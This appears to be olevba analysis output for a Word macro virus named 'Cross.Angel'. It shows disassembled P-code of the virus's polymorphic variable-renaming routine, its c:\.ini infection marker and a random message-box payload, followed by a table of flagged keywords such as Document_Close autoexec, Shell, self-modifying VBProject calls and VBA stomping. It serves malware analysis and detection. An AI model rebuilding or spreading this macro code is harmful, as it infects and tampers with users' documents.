' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld …­ —Ё 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndWith 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld ў™ўµ” 
' 	Ld ©©џ­Ў 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld …­ —Ё 
' 	ArgsMemCall Quit 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	EndIf 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Function »‚°“»(€№А©К, id_FFFE As Variant))
' 	QuoteRem 0x001E 0x0009 "JSMP v1.2"
' Line #114:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	VarDefn К…”‹Й
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #115:
' 	LitDI2 0x0001 
' 	St “–…Јї 
' 	BoS 0x0000 
' 	LitStr 0x0005 "€№А©К"
' 	LitDI2 0x0000 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "»‚°“»"
' 	LitDI2 0x0001 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "К…”‹Й"
' 	LitDI2 0x0002 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ђґўўј"
' 	LitDI2 0x0003 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Џ™Ж‘ў"
' 	LitDI2 0x0004 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "“–…Јї"
' 	LitDI2 0x0005 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "И‚Л•ґ"
' 	LitDI2 0x0006 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ВЎ„џИ"
' 	LitDI2 0x0007 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "·јњ¬µ"
' 	LitDI2 0x0008 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "µ¦Ж©·"
' 	LitDI2 0x0009 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ЉђЄ¤є"
' 	LitDI2 0x000A 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ѕ‘‡њ‰"
' 	LitDI2 0x000B 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ўџ­…†"
' 	LitDI2 0x000C 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "©©џ­Ў"
' 	LitDI2 0x000D 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "°ѓ–Еµ"
' 	LitDI2 0x000E 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ўњВЎґ"
' 	LitDI2 0x000F 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "«ґЙќВ"
' 	LitDI2 0x0010 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ИїЛЄЈ"
' 	LitDI2 0x0011 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "…­ —Ё"
' 	LitDI2 0x0012 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ў™ўµ”"
' 	LitDI2 0x0013 
' 	ArgsSt К…”‹Й 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "КњҐ¤Е"
' 	LitDI2 0x0014 
' 	ArgsSt К…”‹Й 0x0001 
' Line #116:
' 	StartForVariable 
' 	Ld ђґўўј 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	For 
' Line #117:
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Џ™Ж‘ў 
' Line #118:
' 	Do 
' Line #119:
' 	Ld “–…Јї 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld €№А©К 
' 	Ld ђґўўј 
' 	ArgsLd К…”‹Й 0x0001 
' 	FnInStr3 
' 	St “–…Јї 
' Line #120:
' 	Ld “–…Јї 
' 	If 
' 	BoSImplicit 
' 	Ld €№А©К 
' 	LitDI2 0x0001 
' 	Ld “–…Јї 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Џ™Ж‘ў 
' 	Concat 
' 	Ld €№А©К 
' 	Ld “–…Јї 
' 	Ld ђґўўј 
' 	ArgsLd К…”‹Й 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld €№А©К 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St €№А©К 
' 	EndIf 
' Line #121:
' 	Ld “–…Јї 
' 	LoopWhile 
' Line #122:
' 	StartForVariable 
' 	Next 
' Line #123:
' 	Ld €№А©К 
' 	St »‚°“» 
' Line #124:
' 	EndFunc 
' Line #125:
' 	QuoteRem 0x0000 0x0033 "Cross.Angel written by jackie twoflower /Lz0NT /MVT"
' Line #126:
' 	QuoteRem 0x0000 0x0024 "Uses Jackie's Stupid Macro Poly v1.2"
' Line #127:
' 	QuoteRem 0x0000 0x0034 "Office97 and Office2000 compatible | New Cross area!"
' Line #128:
' 	QuoteRem 0x0000 0x002F "Hey my angel, this is for you. Why you left me?"
' Line #129:
' 	QuoteRem 0x0000 0x0023 "I can't live without you! I luv ya!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

